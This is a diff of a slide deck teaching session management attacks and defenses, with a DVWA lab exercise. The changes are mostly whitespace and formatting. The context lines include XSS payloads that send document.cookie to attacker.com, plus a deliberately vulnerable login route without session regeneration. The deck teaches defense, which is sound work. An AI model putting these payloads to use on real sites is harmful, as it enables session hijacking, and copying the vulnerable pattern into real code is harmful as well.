@@ -1,9 +1,3 @@
----
-marp: true
-theme: default
-paginate: true
----
-
 # Session Management Attacks
 
 ## Hijacking and Manipulating User Sessions
@@ -39,10 +33,10 @@ import time
 def generate_session_bad():
     # Sequential counter
     return str(counter)                    # 1, 2, 3...
-    
+
     # Timestamp-based
     return str(int(time.time()))           # 1705276800
-    
+
     # MD5 of username
     return hashlib.md5(username.encode()).hexdigest()
 
@@ -90,13 +84,13 @@ def generate_session_good():
 
 // Method 1: Redirect with cookie
 <script>
-document.location = 'https://attacker.com/steal?c=' 
+document.location = 'https://attacker.com/steal?c='
     + document.cookie;
 </script>
 
 // Method 2: Hidden image request
 <script>
-new Image().src = 'https://attacker.com/steal?c=' 
+new Image().src = 'https://attacker.com/steal?c='
     + document.cookie;
 </script>
 
@@ -143,7 +137,7 @@ Attack flow:
 # VULNERABLE: Session ID not regenerated on login
 @app.route('/login', methods=['POST'])
 def login():
-    user = authenticate(request.form['username'], 
+    user = authenticate(request.form['username'],
                        request.form['password'])
     if user:
         session['user_id'] = user.id  # Same session ID!
@@ -152,7 +146,7 @@ def login():
 # SECURE: Regenerate session on login
 @app.route('/login', methods=['POST'])
 def login():
-    user = authenticate(request.form['username'], 
+    user = authenticate(request.form['username'],
                        request.form['password'])
     if user:
         # Destroy old session, create new one
@@ -240,7 +234,7 @@ Bad tokens: Patterns detected, predictable bits
 
 ```http
 # Maximum security cookie configuration
-Set-Cookie: session=abc123; 
+Set-Cookie: session=abc123;
     Path=/;
     Domain=target.com;
     Secure;              # HTTPS only
@@ -271,17 +265,17 @@ def check_session_timeout():
         now = time.time()
         last_active = session.get('last_active', now)
         created = session.get('created', now)
-        
+
         # Check idle timeout
         if now - last_active > IDLE_TIMEOUT:
             session.clear()
             return redirect('/login?reason=idle')
-        
+
         # Check absolute timeout
         if now - created > ABSOLUTE_TIMEOUT:
             session.clear()
             return redirect('/login?reason=expired')
-        
+
         session['last_active'] = now
 ```
 
@@ -294,21 +288,21 @@ def check_session_timeout():
 def logout():
     # 1. Get session ID before clearing
     session_id = session.get('session_id')
-    
+
     # 2. Remove session from server-side store
     if session_id:
         session_store.delete(session_id)
-    
+
     # 3. Clear all session data
     session.clear()
-    
+
     # 4. Invalidate the session cookie
     response = redirect('/login')
-    response.set_cookie('session', '', 
-        expires=0, 
-        httponly=True, 
+    response.set_cookie('session', '',
+        expires=0,
+        httponly=True,
         secure=True)
-    
+
     # 5. (Optional) Add to token blacklist for JWT
     return response
 
@@ -501,11 +495,11 @@ Defense:
 **Tasks**:
 
 1. Log in to DVWA, capture session cookie
-2. Analyze the `PHPSESSID` format
-3. Test if session changes on login/logout
-4. Check for `HttpOnly` and `Secure` flags
-5. Test session fixation (set your own session ID)
-6. Use Burp Sequencer to analyze token randomness
+1. Analyze the `PHPSESSID` format
+1. Test if session changes on login/logout
+1. Check for `HttpOnly` and `Secure` flags
+1. Test session fixation (set your own session ID)
+1. Use Burp Sequencer to analyze token randomness
 
 ```bash
 # Check cookie flags
